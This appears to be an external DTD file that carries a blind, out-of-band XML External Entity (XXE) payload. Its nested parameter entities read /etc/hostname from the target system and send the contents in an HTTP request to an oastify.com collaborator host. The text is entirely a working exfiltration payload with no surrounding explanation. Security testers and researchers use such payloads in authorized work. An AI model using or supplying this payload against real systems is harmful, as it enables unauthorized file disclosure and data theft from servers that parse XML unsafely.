<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://vhg2tjf70r712n1g56xyt08vzm5dt5hu.oastify.com/?x=%file;'>">
%eval;
%exfil;
